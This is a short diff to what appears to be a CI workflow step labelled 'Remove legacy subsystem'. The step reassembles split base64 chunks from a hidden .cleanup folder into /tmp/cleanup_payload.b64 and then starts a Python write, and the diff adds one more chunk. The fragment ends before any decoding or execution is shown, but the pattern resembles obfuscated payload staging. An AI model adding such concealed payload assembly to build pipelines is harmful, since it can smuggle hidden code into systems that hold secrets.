@@ -32,7 +32,7 @@ jobs:
       - name: Remove legacy subsystem
         shell: bash
         run: |
-          cat .cleanup/chunk_00.txt .cleanup/chunk_01.txt .cleanup/chunk_02.txt .cleanup/chunk_03.txt .cleanup/chunk_04.txt > /tmp/cleanup_payload.b64
+          cat .cleanup/chunk_00a.txt .cleanup/chunk_00b.txt .cleanup/chunk_01.txt .cleanup/chunk_02.txt .cleanup/chunk_03.txt .cleanup/chunk_04.txt > /tmp/cleanup_payload.b64
           python - <<'PY'
           from pathlib import Path
           Path('/tmp/cleanup_payload.b64').write_bytes(
